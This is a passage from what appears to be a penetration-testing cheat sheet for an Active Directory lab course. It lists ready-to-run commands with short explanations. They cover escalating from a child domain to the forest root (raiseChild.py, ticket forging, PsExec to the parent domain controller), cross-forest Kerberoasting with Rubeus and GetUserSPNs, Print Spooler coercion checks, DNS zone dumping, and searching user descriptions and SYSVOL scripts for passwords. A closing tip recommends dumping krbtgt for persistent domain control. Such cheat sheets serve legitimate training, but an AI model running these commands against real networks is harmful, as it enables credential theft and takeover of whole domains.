**What:** Linux equivalent — forge the ticket (`-extra-sid` = EA), load it, then PsExec to the **parent** DC with Kerberos (`-k -no-pass`). **Output:** SYSTEM shell on the parent DC = forest owned.
{: .cmd-desc}

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
**What:** `lookupsid` brute-forces/returns the domain SID; `raiseChild` fully automates the child→parent escalation. **Output:** Domain SID / an automatic parent-domain compromise.
{: .cmd-desc}

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
**What:** Cross-forest Kerberoasting (bidirectional trust) and finding foreign group members you can abuse. **Output:** Roastable accounts in the trusted forest + foreign footholds.
{: .cmd-desc}

## 21. Miscellaneous Misconfigurations

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
**What:** Checks whether the Print Spooler (MS-RPRN) is running — a coercion primitive. **Output:** `True` ⇒ usable for relay/coercion.
{: .cmd-desc}

```bash
adidnsdump -u inlanefreight\forend ldap://172.16.5.5
adidnsdump -u inlanefreight\forend ldap://172.16.5.5 -r
```
**What:** Dumps the AD-integrated DNS zone over LDAP; `-r` resolves records hidden from anonymous listing via A-queries. **Output:** Internal hostname↔IP map.
{: .cmd-desc}

```powershell
Get-DomainUser | Select-Object samaccountname,description
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
**What:** Reads user `description` fields (passwords are often stashed there) and finds accounts flagged `PASSWD_NOTREQD`. **Output:** Possible plaintext creds / weak accounts.
{: .cmd-desc}

```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
**What:** Lists logon scripts in SYSVOL under your current user context. **Output:** Scripts that may contain creds or mapped-drive secrets.
{: .cmd-desc}

{% endraw %}

<div class="callout tip"><span class="callout-title">Workflow reminder</span>Sync the clock to the DC, enumerate the password policy before any spray, collect BloodHound the moment you get a credential, and keep <code>-just-dc-user krbtgt</code> handy — it is the key to permanent domain persistence.</div>

{% include toc_sidebar.html %}
{% include copy_buttons.html %}
